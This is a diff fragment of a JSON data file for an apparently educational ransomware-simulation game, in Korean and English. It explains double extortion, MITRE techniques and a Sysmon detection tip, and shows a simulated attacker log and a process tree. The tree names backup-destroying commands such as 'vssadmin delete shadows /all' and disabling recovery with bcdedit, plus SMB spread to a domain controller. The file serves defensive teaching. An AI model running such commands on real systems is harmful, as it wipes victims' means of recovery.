+      "expert": "이중 협박(Double Extortion)은 2019년 Maze 랜섬웨어가 최초 도입했습니다. 데이터 유출 사이트(Leak Site)에 피해자 데이터를 공개하겠다고 협박합니다. MITRE T1567 (Exfiltration Over Web Service)와 T1486이 결합됩니다. Registry Run 키를 통한 지속성(T1547.001)으로 재부팅 후에도 암호화가 계속됩니다.",
+      "expertEn": "Double extortion was pioneered by Maze ransomware in 2019. Threatens to publish victim data on leak sites. Combines MITRE T1567 with T1486. Persistence via Registry Run key (T1547.001) ensures encryption continues after reboot.",
+      "defTooltip": "Registry Run 키(HKCU\\...\\Run)에 새로운 값 추가를 Sysmon Event ID 13으로 감시하세요. 특히 Temp 폴더의 실행 파일을 가리키는 Run 값은 랜섬웨어 지속성 지표입니다.",
+      "defTooltipEn": "Monitor new values in Registry Run key (HKCU\\...\\Run) via Sysmon Event ID 13. Run values pointing to executables in Temp folders are ransomware persistence indicators.",
+      "hackerLog": {
+        "title": "랜섬웨어 공격 완료",
+        "lines": [
+          { "text": "Registry Run: WindowsSecurityHealth → encryptor.exe", "desc": "재부팅 후에도 암호화를 지속하는 레지스트리 설정" },
+          { "text": "Data stolen before encryption: 156.78 MB", "desc": "암호화 전 데이터 탈취 완료 (이중 협박용)" },
+          { "text": "Files Encrypted: 17,421 | Ransom: 5 BTC", "desc": "총 17,421개 파일 암호화, 2.5억원 요구" }
+        ]
+      },
+      "terms": [
+        { "term": "Double Extortion", "desc": "파일 암호화와 데이터 유출 협박을 동시에 하는 랜섬웨어 전략입니다." },
+        { "term": "Leak Site", "desc": "랜섬웨어 그룹이 피해자 데이터를 공개하는 다크웹 사이트입니다." },
+        { "term": "Registry Run Key", "desc": "시스템 시작 시 자동 실행되는 프로그램을 등록하는 레지스트리 경로입니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 9100)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "Get-ChildItem (file enumeration)", "depth": 2, "alert": true, "minStep": 0 },
+    { "name": "vssadmin.exe delete shadows /all", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "bcdedit.exe (recovery disabled)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "wbadmin.exe (catalog deleted)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "RSA-4096 + AES-256 KeyGen", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "File Encryption Loop (17,421 files)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "SMB → \\\\fileserver01 (network spread)", "depth": 3, "alert": true, "minStep": 4 },
+    { "name": "SMB → \\\\dc01\\SYSVOL (network spread)", "depth": 3, "alert": true, "minStep": 4 },
+    { "name": "!!!READ_ME!!!.txt (ransom note)", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "Registry Run key (persistence)", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
